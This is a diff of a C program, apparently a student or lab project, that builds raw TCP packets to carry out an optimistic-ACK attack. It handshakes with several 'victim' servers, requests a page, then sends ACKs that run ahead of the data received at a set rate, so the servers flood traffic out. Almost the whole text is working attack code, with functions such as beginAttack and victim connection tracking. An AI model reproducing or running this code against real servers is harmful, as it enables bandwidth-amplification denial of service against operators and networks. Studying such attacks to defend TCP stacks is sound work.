@@ -17,10 +17,11 @@
 //TCP header (struct tcphdr) definition
 #include <linux/tcp.h>
 
-#define MSS (1460)
-#define wscale (4)
-#define client_bw (1544000.0)
-#define maxwindow (240000)
+// Constants
+unsigned MSS;
+unsigned wscale;
+double client_bw;
+unsigned maxwindow;
 
 //Pseudo header needed for calculating the TCP header checksum
 struct pseudoTCPPacket {
@@ -107,12 +108,7 @@ int send_packet(int socket,
                 unsigned content_length,
                 char syn,
                 char fin,
-                char rst,
-                char is_ack,
-                unsigned short window,
-                int w_scale) {
-    // TODO implement send packet to construct the packet and send
-    // it based to the provided socket
+                char is_ack) {
 
     int bytes_sent;
     struct tcphdr *tcpHdr;
@@ -165,7 +161,6 @@ int send_packet(int socket,
     memcpy(data, content, content_length);
 
     //Populate tcpHdr
-    // TODO WHAT IS THE SOURCE PORT
     tcpHdr->source = htons(6); //16 bit in nbp format of source port
     tcpHdr->dest = htons(m_connection->dst_port); //16 bit in nbp format of destination port
     tcpHdr->seq = htonl(seq_nbr); //32 bit sequence number, initially set to zero
@@ -186,15 +181,14 @@ int send_packet(int socket,
     tcpHdr->ece = 0; //Congestion control mechanism
     tcpHdr->urg = 0; //Urgent flag
     tcpHdr->psh = 0; //Push data immediately
-    tcpHdr->rst = rst; //RST flag
+    tcpHdr->rst = 0; //RST flag
     tcpHdr->syn = syn; //SYN flag
     tcpHdr->fin = fin; //Terminates the connection
-    tcpHdr->window = window;//0xFFFF; //16 bit max number of databytes
+    tcpHdr->window = 0xFFFF; //16 bit max number of databytes
     tcpHdr->check = 0; //16 bit check sum. Can't calculate at this point
     tcpHdr->urg_ptr = 0; //16 bit indicate the urgent data. Only if URG flag is set
 
   //Now we can calculate the checksum for the TCP header
-  // TODO WHAT IS THE SRC ADDR??
   pTCPPacket.srcAddr = inet_addr("10.0.0.1"); //32 bit format of source address
   pTCPPacket.dstAddr = m_connection->dst_addr; //32 bit format of source address
   pTCPPacket.zero = 0; //8 bit always zero
@@ -234,7 +228,7 @@ unsigned getIndex(u_int32_t ip) {
   index = ip>>24;
   return index;
 }
-/* TODO This will take 3 arguments. The list of all the connections
+/* This will take 3 arguments. The list of all the connections
  * the socket, and the victim to return on.
  * If any packets arrive that do not belong to the current host,
  * it will check for an overrun
@@ -243,9 +237,6 @@ unsigned read_packet(struct victim_connection *m_victim,
                      int sock,
                      struct victim_connection *m_victims,
                      unsigned num_victims) {
-
-    // TODO keep reading the socket for a relevent ip
-    // update the sequence number
 
     while (1) {
       char buff[65535];
@@ -306,25 +297,44 @@ void handshake(struct victim_connection *m_victim,
     unsigned content_length = 0;
     char syn = 0;
     char fin = 0;
-    char rst = 0;
-    unsigned short window = 5840;
-    int w_scale = 0;
-    send_packet(sock,m_victim,send_seq,ack_nbr,
-                content,content_length,1,fin,rst,0,
-                MSS,w_scale);
+    send_packet(sock,                   // socket
+                m_victim,               // connection
+                send_seq,               // sequence number
+                ack_nbr,                // ack number
+                content,                // content
+                content_length,         // content length
+                1,                      // syn
+                fin,                    // fin
+                0);                     // is ack
+
     unsigned read_seq = read_packet(m_victim, sock, m_victims, victims);
   //printf("Received packet with sequence num: %u\n", read_seq);
     send_seq +=1;
     ack_nbr = 0;
     ack_nbr = (long)read_seq+1;
-    send_packet(sock,m_victim,send_seq,ack_nbr,
-                content,content_length,syn,fin,rst,1,
-                window,w_scale);
+    send_packet(sock,                   // socket
+                m_victim,               // connection
+                send_seq,               // sequence number
+                ack_nbr,                // ack number
+                content,                // content
+                content_length,         // content length
+                syn,                    // syn
+                fin,                    // fin
+                1);                     // is ack
+
     content = "GET / HTTP/1.0\r\n\r\n";
     content_length = strlen(content);
-    send_packet(sock,m_victim,send_seq,ack_nbr,
-    content,content_length,syn,fin,rst,1,
-    window,w_scale);
+
+    send_packet(sock,                   // socket
+                m_victim,               // connection
+                send_seq,               // sequence number
+                ack_nbr,                // ack number
+                content,                // content
+                content_length,         // content length
+                syn,                    // syn
+                fin,                    // fin
+                1);                     // is ack
+
     m_victim->send_seq = send_seq + content_length;
 
 }
@@ -379,7 +389,6 @@ int beginAttack(int duration, double target_rate, int num_victims) {
 
     // local variables
     int sock, i;
-    // TODO Implement
     struct victim_connection m_victims[num_victims];
     double curr_rate = target_rate / 10;
 
@@ -407,8 +416,6 @@ int beginAttack(int duration, double target_rate, int num_victims) {
       }
     }
 
-    // TODO FOR MULTI CONNECTION DO THE NEXT 3 LINES TOGETHER FOR EACH
-    // VICTIM
     // Connect to each server using 3-way handshake
     for(i = 0; i < num_victims; i++){
 
@@ -424,6 +431,7 @@ int beginAttack(int duration, double target_rate, int num_victims) {
           = m_victims[i].last_received_seq
           = m_victims[i].last_sent_ack
           = read_seq;
+
     }
 
     pthread_t tid;
@@ -459,25 +467,21 @@ int beginAttack(int duration, double target_rate, int num_victims) {
 
         // Go through each connection and send the next ack
 
-        send_packet(sock,                       // socket
-                    currConnection,             // connection
-                    currConnection->send_seq,          // sequence number
-                    currConnection->last_sent_ack,     // ack number
-                    "",                         // content
-                    0,                          // content length
-                    0,                          // syn
-                    0,                          // fin
-                    0,                          // rst
-                    1,                          // is_ack
-                    5840,                       // window
-                    0);                         // w_scale
+        send_packet(sock,                             // socket
+                    currConnection,                   // connection
+                    currConnection->send_seq,         // sequence number
+                    currConnection->last_sent_ack,    // ack number
+                    "",                               // content
+                    0,                                // content length
+                    0,                                // syn
+                    0,                                // fin
+                    1);                               // is_ack
 
         gettimeofday(&after_sent, NULL);
 
         // for each connection increment the ack by the window size
         currConnection->last_sent_ack += currConnection->window;
 
-        // TODO go to sleep for the right amount of time
         double elapsed_seconds = (after_sent.tv_sec - before_sent.tv_sec) +
                           1.0e-6 * (after_sent.tv_usec - before_sent.tv_usec);
 
@@ -512,17 +516,14 @@ int beginAttack(int duration, double target_rate, int num_victims) {
     for (i = 0; i < num_victims; i++) {
 
       send_packet(sock,                         // socket
-                  &m_victims[i],                    // connection
-                  m_victims[i].send_seq,            // sequence number
+                  &m_victims[i],                // connection
+                  m_victims[i].send_seq,        // sequence number
                   0,                            // ack number
                   "",                           // content
                   0,                            // content length
                   0,                            // syn
                   1,                            // fin
-                  0,                            // rst
-                  0,                            // is_ack
-                  5840,                         // window
-                  0);                           // w_scale
+                  0);                           // is_ack
 
     }
     //printf("Waiting to join\n");
@@ -538,13 +539,16 @@ int beginAttack(int duration, double target_rate, int num_victims) {
 }
 
 
-
 int main(int argc, char const *argv[]) {
-  //printf("In Main: About to begin:");
-  // TODO, more arguments will be provided as the ip and ports of victims
+
+  MSS = 1460;
+  wscale = atoi(argv[3]);
+  client_bw = 1544000.0;
+  maxwindow = 65535 << wscale;
 
   int num_victims = atoi(argv[1]);
   int target_rate = atoi(argv[2]);
+
   beginAttack(30, target_rate, num_victims);
 
   return 0;
